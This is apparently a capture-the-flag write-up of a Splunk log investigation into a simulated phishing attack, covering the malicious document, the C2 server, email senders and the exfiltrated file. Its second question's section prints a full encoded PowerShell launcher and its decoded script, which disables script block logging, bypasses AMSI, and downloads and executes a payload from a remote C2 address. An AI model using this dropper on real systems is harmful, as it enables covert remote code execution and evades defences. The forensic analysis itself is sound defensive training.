# Splunk

Splunk is a log collection and analysis tool. You can look at all the events for your network and highlight weird ones. In this case, we're given some existing logs and told an attack is somewhere in there.

# Question 1

> What is the short host name of Professor Banas' computer? 

We can search for `*`, all events, and look at the sidebar. If we click on `host` it'll show us all the values for this attribute - in this case all the different hosts that data was collected from - `sweetums`, `SWEETUMS` and `stoq.elfu.org`. To be thorough we can click on `stoq.elfu.org` to only show events from that host and see that none of them are from windows event logs, so it's safe to assume this isn't a workstation and we don't need to worry about it. So we know the professor's workstation is `sweetums`.

# Question 2

> What is the name of the sensitive file that was likely accessed and copied by the attacker?

Let's start by looking at all the events from the workstation with `host="sweetums"`. The first thing we see is an event from powershell, which was called with this command line invocation:

```
powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUAbgBlAFIAaQBDAC4ARABJAEMAVABJAG8ATgBBAHIAeQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAGIAagBlAGMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABTAEUAewBbAFMAQwByAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAEUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAEwAVQBlACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBqAEUAYwB0ACAAQwBvAGwAbABFAGMAVABpAG8AbgBzAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBzAFQAcgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBjAEUAUABvAEkAbgBUAE0AYQBOAGEARwBlAHIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABJAG4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAHcALQBPAGIAagBFAEMAVAAgAFMAeQBzAFQARQBNAC4ATgBlAFQALgBXAGUAQgBDAEwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAHUARQBTAFQAXQA6ADoARABFAEYAYQBVAEwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBFAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAGUATgBUAGkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcATwBSAGsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAegBkACEAUABtAHcAMwBKAC8AcQBuAHUAVwBvAEgAWAB+AD0AZwAuAHsAPgBwACwARwBFAF0AOgB8ACMATQBSACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA0ADQALgAyADAAMgAuADQANgAuADIAMQA0ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AcgBlAFQAOQBYAFEAQQBsADAARQBNAEoAbgB4AHUAawBFAFoAeQAvADcATQBTADcAMABYADQAPQAiACkAOwAkAEQAQQBUAGEAPQAkAFcAQwAuAEQAbwB3AG4AbABPAEEARABEAEEAdABBACgAJABzAEUAcgArACQAVAApADsAJABJAHYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAEUATgBHAHQASABdADsALQBKAE8ASQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

`-enc` is used to pass encoded scripts, so we know the big string in our command line is just base64 encoded. If we [put it into cyberchef and experiment with the character encoding]((https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('OEM%20United%20States%20(437)')Encode_text('UTF-8%20(65001)'/disabled)&input=U1FCR0FDZ0FKQUJRQUZNQVZnQmxBSElBVXdCcEFHOEFUZ0JVQUdFQVFnQk1BR1VBTGdCUUFGTUFWZ0JGQUZJQWN3QkpBRThBYmdBdUFFMEFRUUJLQUc4QWNnQWdBQzBBWndCRkFDQUFNd0FwQUhzQUpBQkhBRkFBUmdBOUFGc0FVZ0JsQUdZQVhRQXVBRUVBVXdCekFFVUFUUUJDQUd3QWVRQXVBRWNBUlFCVUFGUUFlUUJRQUVVQUtBQW5BRk1BZVFCekFIUUFaUUJ0QUM0QVRRQmhBRzRBWVFCbkFHVUFiUUJsQUc0QWRBQXVBRUVBZFFCMEFHOEFiUUJoQUhRQWFRQnZBRzRBTGdCVkFIUUFhUUJzQUhNQUp3QXBBQzRBSWdCSEFFVUFkQUJHQUdrQVJRQmdBRXdBWkFBaUFDZ0FKd0JqQUdFQVl3Qm9BR1VBWkFCSEFISUFid0IxQUhBQVVBQnZBR3dBYVFCakFIa0FVd0JsQUhRQWRBQnBBRzRBWndCekFDY0FMQUFuQUU0QUp3QXJBQ2NBYndCdUFGQUFkUUJpQUd3QWFRQmpBQ3dBVXdCMEFHRUFkQUJwQUdNQUp3QXBBRHNBU1FCR0FDZ0FKQUJIQUZBQVJnQXBBSHNBSkFCSEFGQUFRd0E5QUNRQVJ3QlFBRVlBTGdCSEFHVUFWQUJXQUVFQWJBQjFBRVVBS0FBa0FHNEFWUUJzQUV3QUtRQTdBRWtBWmdBb0FDUUFSd0JRQUVNQVd3QW5BRk1BWXdCeUFHa0FjQUIwQUVJQUp3QXJBQ2NBYkFCdkFHTUFhd0JNQUc4QVp3Qm5BR2tBYmdCbkFDY0FYUUFwQUhzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUNjQUt3QW5BR3dBYndCakFHc0FUQUJ2QUdjQVp3QnBBRzRBWndBbkFGMEFQUUF3QURzQUpBQkhBRkFBUXdCYkFDY0FVd0JqQUhJQWFRQndBSFFBUWdBbkFDc0FKd0JzQUc4QVl3QnJBRXdBYndCbkFHY0FhUUJ1QUdjQUp3QmRBRnNBSndCRkFHNEFZUUJpQUd3QVpRQlRBR01BY2dCcEFIQUFkQUJDQUd3QWJ3QmpBR3NBU1FCdUFIWUFid0JqQUdFQWRBQnBBRzhBYmdCTUFHOEFad0JuQUdrQWJnQm5BQ2NBWFFBOUFEQUFmUUFrQUhZQVlRQnNBRDBBV3dCREFFOEFUQUJzQUVVQVl3QlVBR2tBYndCT0FITUFMZ0JIQUVVQWJnQmxBRklBYVFCREFDNEFSQUJKQUVNQVZBQkpBRzhBVGdCQkFISUFlUUJiQUZNQWRBQnlBRWtBVGdCSEFDd0FVd0I1QUZNQVZBQkZBRzBBTGdCUEFHSUFhZ0JsQUdNQVZBQmRBRjBBT2dBNkFFNEFaUUJYQUNnQUtRQTdBQ1FBZGdCQkFHd0FMZ0JCQUdRQVJBQW9BQ2NBUlFCdUFHRUFZZ0JzQUdVQVV3QmpBSElBYVFCd0FIUUFRZ0FuQUNzQUp3QnNBRzhBWXdCckFFd0Fid0JuQUdjQWFRQnVBR2NBSndBc0FEQUFLUUE3QUNRQWRnQmhBRXdBTGdCQkFFUUFaQUFvQUNjQVJRQnVBR0VBWWdCc0FHVUFVd0JqQUhJQWFRQndBSFFBUWdCc0FHOEFZd0JyQUVrQWJnQjJBRzhBWXdCaEFIUUFhUUJ2QUc0QVRBQnZBR2NBWndCcEFHNEFad0FuQUN3QU1BQXBBRHNBSkFCSEFGQUFRd0JiQUNjQVNBQkxBRVVBV1FCZkFFd0FUd0JEQUVFQVRBQmZBRTBBUVFCREFFZ0FTUUJPQUVVQVhBQlRBRzhBWmdCMEFIY0FZUUJ5QUdVQVhBQlFBRzhBYkFCcEFHTUFhUUJsQUhNQVhBQk5BR2tBWXdCeUFHOEFjd0J2QUdZQWRBQmNBRmNBYVFCdUFHUUFid0IzQUhNQVhBQlFBRzhBZHdCbEFISUFVd0JvQUdVQWJBQnNBRndBVXdCakFISUFhUUJ3QUhRQVFnQW5BQ3NBSndCc0FHOEFZd0JyQUV3QWJ3Qm5BR2NBYVFCdUFHY0FKd0JkQUQwQUpBQldBRUVBYkFCOUFFVUFiQUJUQUVVQWV3QmJBRk1BUXdCeUFFa0FVQUJVQUVJQWJBQlBBRU1BU3dCZEFDNEFJZ0JIQUVVQWRBQkdBRWtBWlFCZ0FHd0FSQUFpQUNnQUp3QnpBR2tBWndCdUFHRUFkQUIxQUhJQVpRQnpBQ2NBTEFBbkFFNEFKd0FyQUNjQWJ3QnVBRkFBZFFCaUFHd0FhUUJqQUN3QVV3QjBBR0VBZEFCcEFHTUFKd0FwQUM0QVV3QkZBRlFBVmdCQkFFd0FWUUJsQUNnQUpBQk9BRlVBYkFCc0FDd0FLQUJPQUVVQVZ3QXRBRThBUWdCcUFFVUFZd0IwQUNBQVF3QnZBR3dBYkFCRkFHTUFWQUJwQUc4QWJnQnpBQzRBUndCRkFHNEFaUUJ5QUVrQVF3QXVBRWdBWVFCekFHZ0FVd0JsQUZRQVd3QnpBRlFBY2dCSkFFNEFSd0JkQUNrQUtRQjlBRnNBVWdCRkFHWUFYUUF1QUVFQVV3QlRBRVVBVFFCQ0FHd0FXUUF1QUVjQVJRQlVBRlFBV1FCUUFHVUFLQUFuQUZNQWVRQnpBSFFBWlFCdEFDNEFUUUJoQUc0QVlRQm5BR1VBYlFCbEFHNEFkQUF1QUVFQWRRQjBBRzhBYlFCaEFIUUFhUUJ2QUc0QUxnQkJBRzBBY3dCcEFGVUFkQUJwQUd3QWN3QW5BQ2tBZkFBL0FIc0FKQUJmQUgwQWZBQWxBSHNBSkFCZkFDNEFSd0JGQUZRQVJnQnBBR1VBYkFCRUFDZ0FKd0JoQUcwQWN3QnBBRWtBYmdCcEFIUUFSZ0JoQUdrQWJBQmxBR1FBSndBc0FDY0FUZ0J2QUc0QVVBQjFBR0lBYkFCcEFHTUFMQUJUQUhRQVlRQjBBR2tBWXdBbkFDa0FMZ0JUQUVVQWRBQldBR0VBYkFCVkFHVUFLQUFrQUU0QVZRQnNBRXdBTEFBa0FGUUFjZ0IxQUdVQUtRQjlBRHNBZlFBN0FGc0FVd0I1QUZNQWRBQmxBRTBBTGdCT0FHVUFWQUF1QUZNQVJRQlNBSFlBYVFCakFFVUFVQUJ2QUVrQWJnQlVBRTBBWVFCT0FHRUFSd0JsQUhJQVhRQTZBRG9BUlFCWUFGQUFaUUJqQUZRQU1RQXdBREFBUXdCUEFFNEFkQUJKQUc0QVZRQmxBRDBBTUFBN0FDUUFkd0JqQUQwQVRnQkZBSGNBTFFCUEFHSUFhZ0JGQUVNQVZBQWdBRk1BZVFCekFGUUFSUUJOQUM0QVRnQmxBRlFBTGdCWEFHVUFRZ0JEQUV3QWFRQkZBRTRBVkFBN0FDUUFkUUE5QUNjQVRRQnZBSG9BYVFCc0FHd0FZUUF2QURVQUxnQXdBQ0FBS0FCWEFHa0FiZ0JrQUc4QWR3QnpBQ0FBVGdCVUFDQUFOZ0F1QURFQU93QWdBRmNBVHdCWEFEWUFOQUE3QUNBQVZBQnlBR2tBWkFCbEFHNEFkQUF2QURjQUxnQXdBRHNBSUFCeUFIWUFPZ0F4QURFQUxnQXdBQ2tBSUFCc0FHa0Fhd0JsQUNBQVJ3QmxBR01BYXdCdkFDY0FPd0FrQUhjQVF3QXVBRWdBUlFCQkFFUUFSUUJ5QUZNQUxnQkJBRVFBWkFBb0FDY0FWUUJ6QUdVQWNnQXRBRUVBWndCbEFHNEFkQUFuQUN3QUpBQjFBQ2tBT3dBa0FGY0FZd0F1QUZBQWNnQnZBRmdBZVFBOUFGc0FVd0I1QUZNQVZBQmxBRTBBTGdCT0FHVUFkQUF1QUZjQVpRQkNBRklBUlFCUkFIVUFSUUJUQUZRQVhRQTZBRG9BUkFCRkFFWUFZUUJWQUV3QVZBQlhBR1VBWWdCUUFISUFid0JZQUhrQU93QWtBRmNBUXdBdUFGQUFVZ0J2QUZnQWVRQXVBRU1BVWdCRkFFUUFaUUJ1QUZRQVNRQkJBR3dBY3dBZ0FEMEFJQUJiQUZNQWVRQlRBRlFBUlFCdEFDNEFUZ0JGQUZRQUxnQkRBRklBWlFCa0FHVUFUZ0JVQUdrQVFRQnNBRU1BUVFCakFFZ0FaUUJkQURvQU9nQkVBR1VBUmdCaEFIVUFiQUJVQUU0QVpRQlVBSGNBVHdCU0FHc0FRd0JTQUVVQVJBQmxBRzRBVkFCcEFFRUFUQUJUQURzQUpBQlRBR01BY2dCcEFIQUFkQUE2QUZBQWNnQnZBSGdBZVFBZ0FEMEFJQUFrQUhjQVl3QXVBRkFBY2dCdkFIZ0FlUUE3QUNRQVN3QTlBRnNBVXdCNUFGTUFWQUJGQUUwQUxnQlVBR1VBZUFCMEFDNEFSUUJ1QUdNQVR3QmtBRWtBVGdCSEFGMEFPZ0E2QUVFQVV3QkRBRWtBU1FBdUFFY0FaUUJVQUVJQVdRQjBBR1VBVXdBb0FDY0FlZ0JrQUNFQVVBQnRBSGNBTXdCS0FDOEFjUUJ1QUhVQVZ3QnZBRWdBV0FCK0FEMEFad0F1QUhzQVBnQndBQ3dBUndCRkFGMEFPZ0I4QUNNQVRRQlNBQ2NBS1FBN0FDUUFVZ0E5QUhzQUpBQkVBQ3dBSkFCTEFEMEFKQUJCQUZJQVJ3QnpBRHNBSkFCVEFEMEFNQUF1QUM0QU1nQTFBRFVBT3dBd0FDNEFMZ0F5QURVQU5RQjhBQ1VBZXdBa0FFb0FQUUFvQUNRQVNnQXJBQ1FBVXdCYkFDUUFYd0JkQUNzQUpBQkxBRnNBSkFCZkFDVUFKQUJMQUM0QVF3QlBBRlVBYmdCMEFGMEFLUUFsQURJQU5RQTJBRHNBSkFCVEFGc0FKQUJmQUYwQUxBQWtBRk1BV3dBa0FFb0FYUUE5QUNRQVV3QmJBQ1FBU2dCZEFDd0FKQUJUQUZzQUpBQmZBRjBBZlFBN0FDUUFSQUI4QUNVQWV3QWtBRWtBUFFBb0FDUUFTUUFyQURFQUtRQWxBRElBTlFBMkFEc0FKQUJJQUQwQUtBQWtBRWdBS3dBa0FGTUFXd0FrQUVrQVhRQXBBQ1VBTWdBMUFEWUFPd0FrQUZNQVd3QWtBRWtBWFFBc0FDUUFVd0JiQUNRQVNBQmRBRDBBSkFCVEFGc0FKQUJJQUYwQUxBQWtBRk1BV3dBa0FFa0FYUUE3QUNRQVh3QXRBRUlBV0FCdkFGSUFKQUJUQUZzQUtBQWtBRk1BV3dBa0FFa0FYUUFyQUNRQVV3QmJBQ1FBU0FCZEFDa0FKUUF5QURVQU5nQmRBSDBBZlFBN0FDUUFjd0JsQUhJQVBRQW5BR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTBBRFFBTGdBeUFEQUFNZ0F1QURRQU5nQXVBRElBTVFBMEFEb0FPQUF3QURnQU1BQW5BRHNBSkFCMEFEMEFKd0F2QUdFQVpBQnRBR2tBYmdBdkFHY0FaUUIwQUM0QWNBQm9BSEFBSndBN0FDUUFWd0JEQUM0QVNBQkZBRUVBUkFCRkFISUFjd0F1QUVFQVpBQmtBQ2dBSWdCREFHOEFid0JyQUdrQVpRQWlBQ3dBSWdCekFHVUFjd0J6QUdrQWJ3QnVBRDBBY2dCbEFGUUFPUUJZQUZFQVFRQnNBREFBUlFCTkFFb0FiZ0I0QUhVQWF3QkZBRm9BZVFBdkFEY0FUUUJUQURjQU1BQllBRFFBUFFBaUFDa0FPd0FrQUVRQVFRQlVBR0VBUFFBa0FGY0FRd0F1QUVRQWJ3QjNBRzRBYkFCUEFFRUFSQUJFQUVFQWRBQkJBQ2dBSkFCekFFVUFjZ0FyQUNRQVZBQXBBRHNBSkFCSkFIWUFQUUFrQUVRQVlRQjBBRUVBV3dBd0FDNEFMZ0F6QUYwQU93QWtBRVFBWVFCMEFFRUFQUUFrQUdRQVFRQlVBR0VBV3dBMEFDNEFMZ0FrQUVRQVlRQjBBRUVBTGdCc0FFVUFUZ0JIQUhRQVNBQmRBRHNBTFFCS0FFOEFTUUJPQUZzQVF3Qm9BR0VBVWdCYkFGMEFYUUFvQUNZQUlBQWtBRklBSUFBa0FFUUFZUUIwQUVFQUlBQW9BQ1FBU1FCV0FDc0FKQUJMQUNrQUtRQjhBRWtBUlFCWUFBPT0)) we eventually get this powershell script:

```powershell
if($PSVerSioNTaBLe.PSVERsIOn.MAJor -gE 3){
    $GPF=[Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
    IF($GPF){
        $GPC=$GPF.GeTVAluE($nUlL);
        If($GPC['ScriptB'+'lockLogging']){
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
        }
        $val=[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]::NeW();
        $vAl.AdD('EnableScriptB'+'lockLogging',0);
        $vaL.ADd('EnableScriptBlockInvocationLogging',0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl
    }ElSE{
        [SCrIPTBlOCK]."GEtFIe`lD"('signatures','N'+'onPublic,Static').SETVALUe($NUll,(NEW-OBjEct CollEcTions.GEnerIC.HashSeT[sTrING]))
    }
    [REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GETFielD('amsiInitFailed','NonPublic,Static').SEtValUe($NUlL,$True)};
    };
[SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe=0;
$wc=NEw-ObjECT SysTEM.NeT.WeBCLiENT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wC.HEADErS.ADd('User-Agent',$u);
$Wc.ProXy=[SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;
$WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;
$Script:Proxy = $wc.Proxy;
$K=[SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}}}');
$ser='http://144.202.46.214:8080';
$t='/admin/get.php';
$WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");
$DATa=$WC.DownlOADDAtA($sEr+$T);
$Iv=$DatA[0..3];
$DatA=$dATa[4..$DatA.lENGtH];
-JOIN[ChaR[]](& $R $DatA ($IV+$K))|IEX.
```

(cleaned up just a bit)

Some of this seems garbled but it's enough that we can tell what's happening. We see an HTTP request to `http://144.202.46.214:8080/admin/get.php`, which we then cut a bit and assing to `$Data`. Then we do some manipulation with it and the first 4 bytes before eventually piping it (presumably decoded) into IEX / `Invoke-Expression`. This is basically just a dropper that executes some powershell code it gets from that server. We can't look at exactly what code it executes, but we can get a rough idea by searching for `host="sweetums" source="WinEventLog:Microsoft-Windows-Powershell/Operational"`. Most of what we see is invocations of basic powershell commands, ForEach, Get and Where. The most common by far is ForEach, so let's start by looking at calls to `ForEach`:

```
host="sweetums" source="WinEventLog:Microsoft-Windows-Powershell/Operational" ParameterBinding_ForEach_Object_="*"
```

By looking at the events we can see one interesting field:

```
ParameterBinding(ForEach-Object): name="Process"; value="$wc.Headers.Add($_.Name, $_.Value)"
```

Looking at it closer in the sidebar we see most of the values for it are just numbers. At a guess, this is from when the dropper decodes the data. We can look for more interesting events by filtering for rare values: `| rare limit=20 ParameterBinding_ForEach_Object_`. We see a couple file paths which is being used as an InputObject to some for loop, however one stands out:

```
name="InputObject"; value="C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt"
```

It's safe to assume the code is looping over all the contents of a folder and exfiltrating them somehow, so our answer is `C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt`.

# Question 3

> What is the fully-qualified domain name(FQDN) of the command and control(C2) server?

We can search for network events (id 3) and then look at common destination hostnames:

```
EventID="3" | top dest_host
```

Only one result is returned which makes up all of our (logged) network requests: `144.202.46.214.vultr.com`

# Question 4

> What document is involved with launching the malicious PowerShell code?

Since we're told it's a malicious document, let's start by looking for macro-enabled documents with a plaintext search `docm`.

The second event we see is a process create, where WINWORD.exe opens `C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm`, so our answer is `19th Century Holiday Cheer Assignment.docm`.

# Question 5

> How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?

For this we want to look at stoq analysis rather than events from the host, so we use `sourcetype="stoq"`. 

First up, We only want to look at emails to/from the professor. If we look at the first event, we see that somewhere in the `results` array we have an object where `workers.smtp.to` is `carl.banas@faculty.elfu.org`. Since some clients might include contact names or capitalise differently, we search a little more vaguely:

```
results{}.workers.smtp.to="*carl.banas@faculty.elfu.org*"
```

Now we should filter only emails which have the right subject line, which Alice tells us is `Holiday Cheer Assignment Submission`: `results{}.workers.smtp.subject="Holiday Cheer Assignment Submission"`.

Now we just need to look at all the different senders, which we can do with ` | top results{}.workers.smtp.from`. We end up with 21 results, which is the answer to the question.

# Question 6

> What was the password for the zip archive that contained the suspicious file?

To start with, let's look for the zip file. Stoq puts attachment filenames in `payload_meta.extra_data.filename` so we can search for zip attachments with `"results{}.payload_meta.extra_data.filename"="*.zip"`. If we look at the body of this message, we get:

```
Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click "Enable Editing" then "Enable Content" to see it. This was a fun assignment. I hope you like it!  --Bradly Buttercups
```

So the password is 123456789. 

# Question 7

> What email address did the suspicious file come from? 

From the last search, `Bradly.Buttercups@elfu.org`.

# Final Question

> What was the message for Kent that the adversary embedded in this attack? 

Alice gives us a big filter thing which we can put at the end of our last search to get a neat output of the extracted files from this message.

We can actually download these files from `https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/<fullpath>`. If we look at the extracted docm it tells us it's been cleaned up and to look for the core.xml instead. We download that file the same way and find the document description:

```
Kent you are so unfair. And we were going to make you the king of the Winter Carnival.
```